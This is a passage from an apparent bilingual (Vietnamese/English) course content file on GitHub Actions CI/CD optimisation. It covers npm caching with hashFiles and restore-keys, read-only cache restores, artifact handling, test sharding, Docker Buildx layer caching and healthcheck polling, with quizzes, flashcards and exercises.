```visual
        note: "Bất biến tuyệt đối"
        tone: amber
      - label: "Phạm vi & Lưu trữ: Giữa các Job cùng lượt chạy + Tải ZIP"
        sub: "Mặc định giữ 90 ngày -> nên đặt retention-days: 7 cho bản tạm để tiết kiệm 90% dung lượng"
        note: "retention-days: 7"
        tone: emerald
    footer: "Dùng upload-artifact@v4 ở Job sản xuất và download-artifact@v4 ở Job tiêu thụ"
```

steps.headingEn: Lockfile-Based Cache Keys with hashFiles and restore-keys Fallback
steps.bodyEn:
When do you actually need to download new packages from npm? Only when **`package-lock.json`** changes! `actions/cache@v4` models this exact rule via the built-in expression function ==`hashFiles('**/package-lock.json')`==:

```visual
kind: flow
title: "Thuật Toán Tra Cứu Bộ Đệm 2 Tầng: Exact Hit & Fallback restore-keys"
steps:
  - icon: key
    badge: "Bước 1 · Băm khoá"
    title: "Tính SHA-256 Lockfile"
    desc: "Sinh khoá duy nhất gắn với OS và nội dung package-lock.json"
    code: "hashFiles('**/package-lock.json')"
    tone: sky
    edge: "tra cứu khoá chính"
  - icon: zap
    badge: "Trường hợp A · Khớp 100%"
    title: "Exact Cache Hit"
    desc: "PR chỉ sửa code .ts không đổi lockfile -> giải nén ~/.npm trong vài giây!"
    code: "Tăng tốc 3–4x"
    tone: emerald
    edge: "nếu lệch khoá?"
  - icon: search
    badge: "Trường hợp B · Lưới đỡ"
    title: "Partial Hit (restore-keys)"
    desc: "Vừa thêm 1 gói zod mới -> tìm bản đệm tiền tố Linux-npm- gần nhất có sẵn 99% gói cũ"
    code: "restore-keys: Linux-npm-"
    tone: amber
    edge: "cuối Job"
  - icon: disk
    badge: "Bước cuối · Cập nhật"
    title: "Chỉ tải gói mới & Lưu"
    desc: "Tải bổ sung đúng gói zod rồi đóng gói thành Cache Key theo mã băm mới"
    code: "Post Cache Save"
    tone: cyan
```

```yaml
- name: Khôi phục bộ đệm tải gói npm
  uses: actions/cache@v4
  with:
    path: ~/.npm
    key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
    restore-keys: |
      ${{ runner.os }}-npm-
```

> [!TIP] Cleanest shortcut for standard Node.js projects
> When you only need to cache the default npm download directory, simply write `cache: "npm"` inside `actions/setup-node@v4` — under the hood it runs this exact `package-lock.json` hashing and `~/.npm` caching without requiring a manual `actions/cache@v4` block!

steps.headingEn: Pitfalls of Caching node_modules and the **Read-Only Cache** Pattern
steps.bodyEn:
Some newcomers zip the entire `node_modules` directory with `actions/upload-artifact@v4` in the first Job to pass to later Jobs, or configure all 4 parallel Jobs to both read and overwrite the Cache. Both practices slow down the pipeline and introduce security risks:

```visual
kind: compare
title: "So sánh: Đẩy node_modules vào Artifact vs Mô hình Read-Only Cache"
subtitle: "Tách bạch rõ ràng: ~/.npm đi qua Cache chỉ đọc · dist/ gọn nhẹ đi qua Artifact"
left:
  badge: "KHÔNG TỐI ƯU · Chậm 4–6 phút & Lỗi quyền"
  title: "Đẩy node_modules vào Artifact & Ghi đè Cache bừa bãi"
  tone: rose
  code: |
    # CÁCH LÀM KHÔNG HIỆU QUẢ: Nén 50.000 tệp nhỏ!
    - uses: actions/upload-artifact@v4
      with:
        name: node-deps
        path: node_modules/
  lang: yaml
  bullets:
    - "`node_modules` chứa **35.000 – 60.000 tệp nhỏ li ti** kèm hàng trăm symlink trong `.bin/`"
    - "Quét đĩa, nén và tải qua Artifact ngốn **4–6 phút**, khi giải nén còn dễ mất cờ thực thi (`chmod +x`) gây lỗi `Permission denied` lúc gọi `eslint` / `tsc`!"
    - "Nếu 4 Job song song cùng gọi `actions/cache@v4` đầy đủ, cuối Job cả 4 máy đua nhau nén ghi lặp lại và dễ gây **Cache Poisoning** từ nhánh PR"
right:
  badge: "CHUẨN 2026 · Read-Only Cache + Slim Artifact"
  title: "Chỉ 1 nơi Ghi bộ đệm, các Job song song Chỉ Đọc (restore)"
  tone: emerald
  code: |
    # Trong 4 Job song song (lint, typecheck, test, build):
    - uses: actions/cache/restore@v4
      with:
        path: ~/.npm
        key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}
        restore-keys: ${{ runner.os }}-npm-
    - run: npm ci

    # Chỉ truyền gói sản phẩm gọn nhẹ dist/ sang Job deploy:
    - uses: actions/upload-artifact@v4
      with:
        name: web-dist
        path: dist/
        retention-days: 7
  lang: yaml
  bullets:
    - "Chỉ Job chuẩn bị trên nhánh tin cậy `main` dùng `actions/cache@v4` (hoặc `actions/cache/save@v4`) để ghi bộ đệm"
    - "Các Job kiểm tra song song và nhánh PR dùng ==`actions/cache/restore@v4`==: **chỉ kéo về đọc**, tốn **0 giây** ở bước kết thúc Job và triệt tiêu nguy cơ ô nhiễm bộ đệm!"
    - "Gắn `retention-days: 7` lên `upload-artifact@v4` để tự dọn các bản `dist/` tạm sau 1 tuần"
```

> [!REMEMBER] Key Takeaways
> - **Cache** (`actions/cache@v4` / `cache: "npm"`): Stores intermediate dependencies (`~/.npm`) across runs keyed by `hashFiles('**/package-lock.json')` + `restore-keys` fallback.
> - **Artifact** (`upload-artifact@v4` / `download-artifact@v4`): Stores immutable outputs (`dist/`, error reports) for that exact run; set `retention-days: 7` for temporary builds.
> - **Never** put `node_modules` into an Artifact · Use **`actions/cache/restore@v4`** for parallel Jobs following the **Read-Only Cache** pattern.

readings.noteEn: Modern 2026 standard pattern: only the main branch writes cache updates, while Pull Request branches and parallel Jobs use actions/cache/restore@v4 to read.
readings.taskEn: Explain why having PR check Jobs use actions/cache/restore@v4 is both faster and safer than using the full actions/cache@v4 action.
readings.answerEn: Using cache/restore@v4 skips the Post-job compression and cache upload step entirely (saving 20–40 seconds at the end of every Job), avoids overwrite contention across parallel Jobs, and prevents untrusted PR branches from poisoning the shared cache.

readings.noteEn: Classic mistake when splitting build and deploy Jobs onto two separate Ephemeral Runners while forgetting to pass dist/ via an Artifact.
readings.taskEn: Explain why the deploy Job fails with a missing dist/ directory error even though the preceding build Job passed completely green.
readings.answerEn: Each Job runs on a brand-new, completely isolated Runner VM. Once the build Job finishes, the VM containing dist/ is destroyed; you must use actions/upload-artifact@v4 in build and actions/download-artifact@v4 in deploy.

C07-Q1.qEn: What is the most fundamental difference between **Cache** (`actions/cache@v4`) and **Artifact** (`actions/upload-artifact@v4`) in GitHub Actions?
choicesEn: Cache can only store .txt text files while Artifact is required for binary files

Cache reuses intermediate dependency packages across runs (best-effort), whereas Artifact preserves immutable build outputs (`dist/`, test reports) from a specific run to pass between Jobs or download
Artifacts are completely free with unlimited storage while Cache is billed per second
Cache automatically deploys code to Kubernetes while Artifact does not
C07-Q1.explainEn: If Cache is wiped, the pipeline only runs slower re-downloading from npm and must still succeed; by contrast, an Artifact is a required output of the current commit (such as the `dist/` bundle).

C07-Q2.qEn: Packaging the entire `node_modules` directory (50,000 small files) with `actions/upload-artifact@v4` to pass to downstream Jobs is the fastest and recommended approach for Node.js projects.
C07-Q2.explainEn: Completely false! Compressing and extracting tens of thousands of tiny files in `node_modules` via Artifact takes 4–6 minutes and easily breaks executable symlinks in `.bin/`. Best practice is caching `~/.npm` via Cache + `npm ci`, and passing only `dist/` via Artifact!

C07-Q3.qEn: Which built-in GitHub Actions expression function computes the SHA-256 hash of `package-lock.json` for use as a Cache key?
C07-Q3.explainEn: The `hashFiles('**/package-lock.json')` function produces a unique hash string that changes if and only if the lockfile contents change.

C07-Q4.qEn: When 4 parallel Jobs (`lint`, `typecheck`, `unit-test`, `build`) all need to read an existing `~/.npm` cache without racing to overwrite it at the end, which Action should those Jobs use?
choicesEn: actions/cache/save@v4
actions/cache/restore@v4
actions/upload-artifact@v4
actions/checkout@v4
C07-Q4.explainEn: `actions/cache/restore@v4` performs only the restore step (Read-only) and never runs a Post-job compression/upload step.

C07-Q5.qEn: What is the role of `restore-keys` in `actions/cache@v4` when the primary `key` misses (Cache Miss after adding 1 new npm package)?
choicesEn: Cancels the entire Workflow run immediately
Finds the most recent older cache matching a prefix (e.g. `Linux-npm-`) as a baseline so only the new package needs to be downloaded instead of starting from scratch
Automatically deletes package-lock.json on the current branch
Encrypts the cache with a two-factor password
C07-Q5.explainEn: restore-keys acts as an ordered prefix-matching fallback from newest to oldest, letting you reuse 95–99% of previously downloaded packages.

C07-Q6.qEn: Setting `retention-days: 7` on `actions/upload-artifact@v4` automatically cleans up temporary build packages after 7 days, avoiding wasted organization Artifact storage quota.
C07-Q6.explainEn: True! By default GitHub retains Artifacts for 90 days; for intermediate `dist/` bundles or PR test reports, setting `retention-days: 7` saves up to 90% of storage.

C07-Q7.qEn: On `actions/setup-node@v4`, what short string value should you pass to `cache:` to automatically cache the package download directory for a project using `package-lock.json`?
C07-Q7.explainEn: Setting `cache: "npm"` on `actions/setup-node@v4` automatically hashes `package-lock.json` and caches `~/.npm` accurately without needing a verbose `actions/cache` step.

C07-C1.frontEn: When should you use `Cache` vs `Artifact` in CI/CD?
C07-C1.backEn: Use `Cache` for recurring dependency downloads across runs (`~/.npm`, `.pnpm-store`); use `Artifact` for compiled outputs of the current commit (`dist/`, HTML reports, `sbom.json`).

C07-C2.frontEn: What is the standard `key` structure for `actions/cache@v4` with Node.js?
C07-C2.backEn: `${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}` paired with `restore-keys: ${{ runner.os }}-npm-` as a fallback when the lockfile changes.

C07-C3.frontEn: Why is passing `node_modules` through `upload-artifact` a severe anti-pattern?
C07-C3.backEn: Because 40,000+ tiny files waste 4–6 minutes on compression/extraction I/O and risk breaking executable symlinks inside `node_modules/.bin/`.

C07-C4.frontEn: What is the difference between `actions/cache@v4` and `actions/cache/restore@v4`?
C07-C4.backEn: `actions/cache@v4` both restores at Job start and saves at Job end; `actions/cache/restore@v4` is Read-only, making it ideal for parallel Jobs and PR branches.

C07-C5.frontEn: What is the biggest improvement of `actions/upload-artifact@v4` over the legacy v3?
C07-C5.backEn: Upload/download speeds are up to 90% faster, and Artifacts become immutable immediately once the upload step finishes.

C07-C6.frontEn: By default, when is a GitHub Actions Cache entry automatically evicted?
C07-C6.backEn: When it has not been accessed for 7 consecutive days, or when the repository's total Cache size exceeds 10GB (evicting oldest entries via LRU).

cicd-ex-c07-1.titleEn: Configure actions/cache@v4 to cache ~/.npm by lockfile hash
cicd-ex-c07-1.promptEn:
To speed up `npm ci`, configure a cache step with `actions/cache@v4` right before installing dependencies in the `build` Job:

1. `uses: actions/cache@v4`
2. `with.path: ~/.npm`
3. `with.key` combining the OS `${{ runner.os }}` and `hashFiles('**/package-lock.json')`.
4. `with.restore-keys` containing the fallback prefix `${{ runner.os }}-npm-`.
hintsEn: Set `path: ~/.npm` and `key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}`.
Add `restore-keys: ${{ runner.os }}-npm-` below `key`.

cicd-ex-c07-2.titleEn: Apply Read-Only Cache with actions/cache/restore@v4 for a parallel Job
cicd-ex-c07-2.promptEn:
The `lint` Job running on Pull Request branches should not write back to the shared Cache. Switch the cache step in `lint` to **Read-Only** mode:

1. Change `uses:` to **`actions/cache/restore@v4`**.
2. Set `with.path: ~/.npm` and `with.key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}`.
hintsEn: The read-only sub-action lives in the same repository: `uses: actions/cache/restore@v4`.

cicd-ex-c07-3.titleEn: Upload the compiled dist/ bundle using actions/upload-artifact@v4
cicd-ex-c07-3.promptEn:
After running `npm run build`, add a final step to the `build` Job to package the `dist/` folder as an Artifact for downstream deployment:

1. `uses: actions/upload-artifact@v4`
2. `with.name: web-dist`
3. `with.path: dist/`
4. `with.retention-days: 7`
hintsEn: The `upload-artifact@v4` step is the 5th item in the `steps` array (index `[4]`). Remember to set `retention-days: 7` as an integer.

cicd-ex-c07-4.titleEn: Download the web-dist bundle in the deploy Job using actions/download-artifact@v4
cicd-ex-c07-4.promptEn:
Apply **Build Once, Deploy Anywhere**: the `build` Job already uploaded `web-dist`. Complete the `deploy` Job below to:

1. Declare `needs: build` to wait for `build` to finish.
2. Use `actions/download-artifact@v4` in the first step with `with.name: web-dist` and extract it to `with.path: dist/` (never re-run `npm run build`!).
hintsEn: `needs: build` can be written as a single string or `[build]`.
Place the `- uses: actions/download-artifact@v4` step at the start of `deploy`'s `steps:` array (before `run: ls -la dist/`).

cicd-ex-c07-5.titleEn: Eliminate the anti-pattern of zipping 50,000 node_modules files into upload-artifact
cicd-ex-c07-5.promptEn:
The Workflow below wastes **8 minutes** because someone stuffed the massive `node_modules` folder into `upload-artifact@v4` while forgetting to enable npm caching on `setup-node@v4`!

Optimize it properly:
1. Enable `cache: "npm"` inside `with:` of the `actions/setup-node@v4` step.
2. In the `actions/upload-artifact@v4` step, update `with.path` to keep only **`dist/`** (removing `node_modules` completely).
hintsEn: Add `cache: "npm"` right under `node-version: "22"`, and trim `path:` in `upload-artifact@v4` to `path: dist/`.

C08.titleEn: Pipeline Speed Optimization: Critical Path, Test Sharding & Docker Buildx Cache
C08.summaryEn: Cut CI wait times from 42 minutes to under 5 minutes using a Fan-out/Fan-in graph, E2E Test Sharding, Buildx GHA layer caching, and smart port probing.

steps.headingEn: Overview & Context
steps.bodyEn:
When a Node.js project is freshly initialized, the entire CI pipeline might take only about 90 seconds. But as the project grows with hundreds of Playwright E2E tests and multi-stage Docker images, pipeline execution time can easily balloon to **42 minutes**, slowing down the feedback loop and disrupting the engineering team's workflow.

In this lesson, we apply ==Critical Path Analysis== to cut wait times from 42 minutes down to under **6 minutes** using 4 optimization techniques:

```visual
kind: compare
title: "Đối Chiếu Kiến Trúc: Pipeline Tuần Tự 42 Phút vs DAG + Sharding Dưới 6 Phút"
subtitle: "Tổng thời gian chờ của lập trình viên không phụ thuộc vào tổng số việc, mà phụ thuộc vào nhánh dài nhất (Critical Path)"
left:
  badge: "CHẬM · Chạy tuần tự (Serial)"
  title: "Cộng dồn mọi bước + chờ cứng bằng sleep 30"
  tone: rose
  code: |
    # 1 máy ảo chạy nối tiếp từ đầu tới cuối:
    lint (2p) -> typecheck (3p) -> unit-test (5p)
      -> docker build không cache (8p)
      -> sleep 30 + playwright E2E 400 bài (16p+)
    # => Tổng Đường găng: ~35 - 42 phút!
  lang: text
  bullets:
    - "Thời gian chờ bằng **tổng cộng dồn** tất cả các bước (`2 + 3 + 5 + ...`)"
    - "Mất bộ đệm lớp Docker `builder` mỗi lần cấp Runner mới"
    - "400 bài Playwright chạy trên 1 máy duy nhất kéo dài 16 phút, thêm `sleep 30` dễ gây lỗi chập chờn (*Flaky*)"
right:
  badge: "TỐC ĐỘ CAO · DAG + Sharding 4 Mảnh"
  title: "Chạy song song tối đa + Test Sharding + Buildx Cache"
  tone: emerald
  code: |
    # Xuất phát đồng thời ngay giây thứ 0:
    ├─ lint (2p) ──────────────────────────┐
    ├─ typecheck (3p) ─────────────────────┤
    ├─ unit-test (5p) ─────────────────────┼─► gate (1p)
    ├─ docker buildx cache mode=max (2p) ──┤
    └─ e2e shard [1/4..4/4] (16p/4 = 4p) ──┘
    # => Tổng Đường găng: max(2, 3, 5, 2, 4) + 1 = 6 phút!
  lang: text
  bullets:
    - "Đường găng của cụm kiểm tra song song rút về đúng nhánh dài nhất: **`max(2, 3, 5) + 1 = 6 phút`** (thay vì `2 + 3 + 5 + 1 = 11 phút`)"
    - "16 phút Playwright chia đều cho 4 máy (`--shard=1/4` .. `4/4`) chỉ còn **4 phút**"
    - "Tất cả hội tụ về 1 cổng nhẹ **`gate`** duy nhất để khai báo trong Branch Protection"
```

steps.headingEn: Critical Path Analysis & The Converging gate Pattern
steps.bodyEn:
```visual
kind: illustration
diagram: "cicd:c08"
alt: "Tối ưu đường găng Critical Path từ 42 phút tuần tự xuống 5 phút nhờ DAG song song, chia mảnh Playwright 4 Shards, Buildx Cache và cổng hội tụ Gate"
title: "Tối ưu đường găng (Critical Path): Giảm thời gian Pipeline từ 42 phút xuống dưới 5 phút"
subtitle: "Khắc phục nút thắt tuần tự bằng kỹ thuật Test Sharding, Docker Buildx Cache và một cổng tổng hợp duy nhất"
caption: "So sánh pipeline tuần tự 42 phút với kiến trúc chạy song song kết hợp chia 4 mảnh kiểm thử và cổng hội tụ All-Green Gate"
callouts:
  - num: 1
    label: "Thay thế sleep cố định & Bật Buildx Layer Cache"
    desc: "Thay sleep 45 bằng vòng lặp thăm dò /healthz chính xác từng giây và bật cache-to: type=gha,mode=max rút ngắn đóng gói Docker còn ~1.8 phút."
    tone: emerald
  - num: 2
    label: "Chia mảnh kiểm thử E2E Sharding (1/4 .. 4/4)"
    desc: "Phân bổ 400 bài Playwright đều cho 4 máy ảo chạy song song với --shard=i/4, giảm nhánh dài nhất từ 16 phút xuống 4 phút."
    tone: cyan
  - num: 3
    label: "Mẫu cổng tổng hợp duy nhất (Aggregator Gate)"
    desc: "Gom toàn bộ kết quả nhánh song song về 1 Job nhẹ ci-gate (if: always()) để chỉ cần khai báo duy nhất 1 tên cổng trong Branch Protection."
    tone: emerald
```

Suppose you have 3 independent jobs: `lint` (2 minutes), `typecheck` (3 minutes), `unit-test` (5 minutes), which then converge into a lightweight aggregator job `gate` (1 minute, declaring `needs: [lint, typecheck, unit-test]`):

```visual
kind: flow
title: "Kiến Trúc All-Green Aggregator Gate & Chia Mảnh E2E Sharding"
steps:
  - icon: git-commit
    badge: "Giây 0 · Fan-Out"
    title: "Commit / PR Mới"
    desc: "Kích hoạt đồng thời tất cả các nhánh kiểm tra độc lập"
    code: "Parallel Root Jobs"
    tone: sky
    edge: "chạy đồng thời"
  - icon: cpu
    badge: "Nhánh tĩnh & Unit · max 5p"
    title: "lint · typecheck · unit"
    desc: "3 Job độc lập hoàn tất trong max(2p, 3p, 5p) = 5 phút"
    code: "Critical Path: 5m"
    tone: cyan
    edge: "song song với E2E"
  - icon: boxes
    badge: "Sharding 4 máy · 4p"
    title: "Playwright 1/4 .. 4/4"
    desc: "4 Runner gánh mỗi máy 25% số bài test E2E cùng lúc (16p / 4 = 4p)"
    code: "--shard=${{ matrix.shard }}/4"
    tone: cyan
    edge: "Fan-In hội tụ"
  - icon: shield-check
    badge: "Cổng khoá nhánh · +1p"
    title: "Aggregator Job: gate"
    desc: "Chốt chặn duy nhất cần tích chọn trong GitHub Branch Protection Rules!"
    code: "Tổng cộng: 5p + 1p = 6p"
    tone: emerald
```

> [!TIP] Practical benefit of the "All-Green Aggregator Gate" pattern
> In GitHub's **Branch Protection Rules** settings, instead of having to manually check dozens of individual job names (and having to ask an Admin to update Settings every time you add/remove a Matrix shard or rename a job), you only need to require the green status of a single converging job: **`gate`**!

steps.headingEn: Running E2E Test Suites in Parallel with **Test Sharding** (1/4 .. 4/4)
steps.bodyEn:
Both **Playwright** and **Vitest** in 2026 include built-in sharding flags **`--shard=<shard-index>/<total-shards>`** (for example, the 3rd shard out of 4 total shards passes the exact string ==`--shard=3/4`==). Combined with `strategy.matrix` and ==`fail-fast: false`==, we slice 16 minutes straight down to 4 minutes:

```yaml
e2e-playwright:
  runs-on: ubuntu-latest
  timeout-minutes: 15
  strategy:
    fail-fast: false        # BẮT BUỘC: 1 mảnh lỗi vẫn để 3 mảnh kia chạy hết gom trọn báo cáo!
    matrix:
      shard: [1, 2, 3, 4]
  steps:
    - uses: actions/checkout@v4
    # ... cài đặt dependencies & trình duyệt Chromium ...
    - name: Run Playwright shard ${{ matrix.shard }}/4
      run: npx playwright test --shard=${{ matrix.shard }}/4

    - name: Upload HTML report even when tests fail
      if: ${{ !cancelled() }}
      uses: actions/upload-artifact@v4
      with:
        name: playwright-report-shard-${{ matrix.shard }}
        path: playwright-report/
        retention-days: 7
```

> [!WARNING] Forgetting `if: ${{ !cancelled() }}` means losing reports right when you need them most!
> By default, every Step carries an implicit condition `if: success()`. Without explicitly declaring ==`if: ${{ !cancelled() }}`== (or `if: always()`) on the `actions/upload-artifact@v4` step, as soon as `npx playwright test` detects a failure and returns exit code `1`, the report upload step below it will be **skipped** — wiping out all your failure screenshots!

steps.headingEn: Docker Buildx Cache (type=gha,mode=max) & Replacing Fixed sleep with Healthcheck
steps.bodyEn:
```visual
kind: groups
title: "Tối ưu Docker Buildx Cache và thay thế sleep bằng Polling Healthcheck [!badge:amber:Speed & Stability]"
columns: 2
items:
  - num: 1
    icon: layers
    title: "Docker Buildx Cache (mode=max)"
    badge: "Giữ trọn cả tầng builder"
    tone: sky
    desc: "Máy ảo Ephemeral Runner không có sẵn lớp Docker cũ trên ổ đĩa cục bộ, nên phải lưu đệm qua GitHub Actions Cache Backend."
    bullets:
      - "**`cache-from: type=gha`** kéo lại các lớp đã biên dịch từ lượt chạy trước"
      - "**`cache-to: type=gha,mode=max`** lưu đệm **TẤT CẢ các stage trung gian** (kể cả stage `builder` chạy `npm ci` + `tsc` trong Multi-stage Dockerfile), vượt trội hoàn toàn so với `mode=min` mặc định chỉ lưu stage `runner` cuối cùng!"
    code: |
      - uses: docker/setup-buildx-action@v3
      - uses: docker/build-push-action@v6
        with:
          context: .
          push: false
          tags: ghcr.io/acme/shop-api:${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max
    codeLang: yaml
  - num: 2
    icon: activity
    title: "Thăm dò Sẵn sàng Xác định (Polling)"
    badge: "Loại bỏ lệnh sleep 30"
    tone: emerald
    desc: "Thay thế thói quen đoán mò thời gian khởi động server bằng vòng lặp kiểm tra cổng /healthz chuẩn xác."
    bullets:
      - "**Tác hại kép của `sleep 30`:** Hôm máy khoẻ bật xong sau 3s -> vứt phí 27s vô nghĩa; hôm đám mây bận bật mất 32s -> phát sinh lỗi giả `ECONNREFUSED` tạo ra **Flaky Pipeline**!"
      - "Dùng `curl --retry --retry-connrefused` giúp đi tiếp ngay giây thứ 4 khi `/healthz` trả `200 OK`, đồng thời chịu tải bền bỉ tới `15 * 2 = 30s` nếu hạ tầng chậm"
    code: |
      npm start &
      curl --fail --retry 15 --retry-connrefused \
        --retry-delay 2 http://localhost:3000/healthz
      npx playwright test
    codeLang: bash
```

> [!REMEMBER] Key Takeaways
> - **Critical Path** of a parallel DAG group equals `max(branch durations)` + converging **`gate`** step (use `gate` as the single required check on Branch Protection).
> - **Test Sharding** (`--shard=1/4` .. `4/4`): Always pair with **`fail-fast: false`** and attach **`if: ${{ !cancelled() }}`** to the `upload-artifact@v4` step so reports aren't lost when tests fail.
> - **Multi-stage Docker on CI:** Enable `cache-from: type=gha` and **`cache-to: type=gha,mode=max`** to cache intermediate `builder` stages too.
> - **Replace `sleep 30`:** Use a deterministic polling loop `curl --fail --retry 15 --retry-connrefused http://localhost:3000/healthz`.

readings.noteEn: Industry-standard blueprint splitting a Playwright browser test suite into 4 parallel shards and ensuring HTML reports are uploaded even when tests fail.
readings.taskEn: Find the two configuration lines working together so that when shard #2 fails, shards 1, 3, and 4 finish running and all 4 reports are available for engineers to download.
readings.answerEn: They are `strategy.fail-fast: false` (preventing the other 3 running shards from being cancelled mid-flight when 1 shard turns red) combined with `if: ${{ !cancelled() }}` on the `upload-artifact@v4` step (forcing the report upload step to run even when the preceding test step exits with an error).

readings.noteEn: Analyzing the configuration of a slow 42-minute pipeline: reinstalling npm without cache on every step, running jobs sequentially, and using a fixed sleep 45.
readings.taskEn: Mentally calculate how many minutes the total Critical Path drops if we switch 3 steps—lint (3m), typecheck (4m), unit_test (8m)—to run in parallel and shard e2e_test into 4 shards (20m -> 5m).
readings.answerEn: The initial check group drops from 3+4+8 = 15 minutes down to max(3,4,8) = 8 minutes (or runs in parallel alongside the 5-minute E2E job), saving over 30 minutes of waiting on every code push!

C08-Q1.qEn: Three jobs `lint` (2 minutes), `typecheck` (3 minutes), and `unit-test` (5 minutes) are configured to run in parallel with no dependencies on one another, then converge into job `gate` (`needs: [lint, typecheck, unit-test]`, taking 1 minute). What is the total Critical Path duration of the entire workflow in minutes? (Enter the number only)
C08-Q1.explainEn: The first three jobs start simultaneously, so the parallel group finishes when the longest branch (`unit-test` = 5 minutes) completes, plus 1 minute for `gate` = 6 minutes (instead of 2+3+5+1 = 11 minutes if run sequentially!).

C08-Q2.qEn: Why should we set `fail-fast: false` when sharding E2E tests with `strategy.matrix.shard: [1, 2, 3, 4]`?
choicesEn: To force all 4 virtual machines to never report red errors even when tests fail
So that when 1 shard fails early, the remaining 3 shards still finish running to collect the complete list of all failing tests in a single run
To cut Chromium browser RAM consumption in half
Because Playwright cannot run without the fail-fast: false flag
C08-Q2.explainEn: By default, GitHub Actions sets `fail-fast: true`: as soon as shard 1 fails, it abruptly kills shards 2, 3, and 4, leaving you to fix shard 1 and push again only to discover that shard 4 was also failing!

C08-Q3.qEn: Without declaring a special `if:` condition, an `actions/upload-artifact@v4` step placed after `npx playwright test` will automatically be skipped right when a test fails!
C08-Q3.explainEn: Correct! By default, every step has an implicit `if: success()` condition. You must explicitly set `if: ${{ !cancelled() }}` or `if: always()` on the failure report upload step so it still runs when the test step above exits with a non-zero code.

C08-Q4.qEn: When configuring `docker/build-push-action@v6` with `cache-to: type=gha,mode=max`, what major advantage does `mode=max` provide over the default `mode=min` for a Multi-stage Dockerfile?
choicesEn: It compresses the Docker image 80% smaller
It caches ALL intermediate stages (including the `builder` stage that installs dependencies and compiles TypeScript), rather than only caching layers present in the final `runner` stage
It automatically removes CVE security vulnerabilities in the Alpine base image
It allows skipping the Container Registry login step
C08-Q4.explainEn: In a Multi-stage Dockerfile, the heaviest work (`npm ci` and `npm run build`) lives in the `builder` stage, which gets discarded from the final image. `mode=min` does not cache `builder`—only `mode=max` caches all intermediate layers!

C08-Q5.qEn: What is the main reason placing `sleep 30` before an E2E test step is considered a source of Flaky Pipelines?
choicesEn: The sleep command does not exist on Ubuntu 24.04
It both wastes fixed time on 95% of fast runs and causes false connection errors (`ECONNREFUSED`) on the 5% of runs when a busy cloud server takes 32 seconds to boot
The sleep command consumes 100% of the Runner's CPU
GitHub charges double for sleep commands
C08-Q5.explainEn: Instead of sleeping blindly, polling the `/healthz` endpoint with `curl --retry --retry-connrefused` lets the pipeline proceed the exact second the app is ready while tolerating infrastructure latency.

C08-Q6.qEn: When running Playwright on the 3rd shard out of 4 total shards, what string value is passed to the `--shard=` flag?
C08-Q6.explainEn: The standard Playwright (and Vitest) syntax is `--shard=<shard-index>/<total-shards>`, i.e., `3/4`.

C08-Q7.qEn: Converging multiple parallel check jobs into a lightweight aggregator job `gate` (`needs: [lint, typecheck, unit-test]`) lets you declare only `gate` in Branch Protection Rules while still locking down every check branch.
C08-Q7.explainEn: Correct! This "All-Green Aggregator Gate" pattern is highly practical when combined with Matrix/Sharding or when adding/removing check jobs without needing to edit GitHub repository settings.

C08-C1.frontEn: What is the Critical Path of a CI/CD Pipeline?
C08-C1.backEn: The longest sequential chain of dependent jobs that determines total wait time from pushing code to pipeline completion. To reduce total duration, you must shorten or parallelize the Critical Path!

C08-C2.frontEn: How is the Fan-out / Fan-in pattern written in GitHub Actions?
C08-C2.backEn: Independent jobs (`lint`, `typecheck`, `test`) omit `needs` to fan out in parallel (Fan-out), then a gate job (`gate` / `deploy`) specifies `needs: [lint, typecheck, test]` to converge (Fan-in).

C08-C3.frontEn: What is the recipe for configuring 4-way Test Sharding for Playwright / Vitest on GitHub Actions?
C08-C3.backEn: `strategy: { fail-fast: false, matrix: { shard: [1, 2, 3, 4] } }` combined with the run flag `--shard=${{ matrix.shard }}/4`.

C08-C4.frontEn: Why is `if: ${{ !cancelled() }}` better than `if: always()` on the test report upload step?
C08-C4.backEn: Both run when tests fail, but if a developer manually clicks Cancel to abort a redundant run, `!cancelled()` stops cleanly right away instead of trying to upload incomplete reports like `always()`.

C08-C5.frontEn: Which pair of attributes enables native Docker Buildx layer caching on GitHub Actions?

C08-C6.frontEn: What is the standard command to replace `sleep 30` when waiting for an HTTP server to be ready before E2E tests?

cicd-ex-c08-1.titleEn: Refactor a sequential chain into a parallel DAG with a converging gate job
cicd-ex-c08-1.promptEn:
Three jobs `lint`, `typecheck`, and `unit-test` are currently chained sequentially (`typecheck` waits for `lint`, `unit-test` waits for `typecheck`), wasting double the time!

Refactor this into a **Fan-out / Fan-in** graph:
1. Completely remove the `needs` property from both `typecheck` and `unit-test` so all 3 check jobs start in parallel at second 0.
2. Add a converging job named **`gate`** (`runs-on: ubuntu-latest`) with `needs: [lint, typecheck, unit-test]` and a step `run: echo "All checks green"`.
hintsEn: Delete `needs: lint` under `typecheck` and delete `needs: typecheck` under `unit-test`.
Create a `gate:` block under `jobs:` with `needs: [lint, typecheck, unit-test]`.

cicd-ex-c08-2.titleEn: Distribute the Playwright E2E suite across 4 parallel runners (Sharding)
cicd-ex-c08-2.promptEn:
The single-threaded `e2e` job takes 16 minutes. Cut it down to **4 minutes** using sharding:

1. Add `strategy.fail-fast: false` to the `e2e` job.
2. Declare `strategy.matrix.shard: [1, 2, 3, 4]`.
3. Update the final test execution step to `npx playwright test --shard=${{ matrix.shard }}/4`.
hintsEn: `strategy:` goes at the same indentation level as `runs-on:` and `steps:` inside the `e2e` job.

cicd-ex-c08-3.titleEn: Enable native Docker Buildx layer caching on GitHub Actions (type=gha,mode=max)
cicd-ex-c08-3.promptEn:
Every CI run recompiles the Multi-stage Dockerfile from scratch. Enable Buildx layer caching on the `docker/build-push-action@v6` step:

1. Add `cache-from: type=gha` inside `with:`.
2. Add `cache-to: type=gha,mode=max` inside `with:` to also cache the intermediate `builder` stage.
hintsEn: Both `cache-from` and `cache-to` go inside the `with:` block of `docker/build-push-action@v6`.

cicd-ex-c08-4.titleEn: Ensure Playwright failure reports upload even when tests fail
cicd-ex-c08-4.promptEn:
The QA team complains that whenever Playwright tests turn red, the `Upload Playwright HTML report` step below gets `skipped`, leaving nobody able to download failure screenshots!

Add the condition **`if: ${{ !cancelled() }}`** (or `if: always()`) to the `actions/upload-artifact@v4` step so reports are always saved when tests fail.
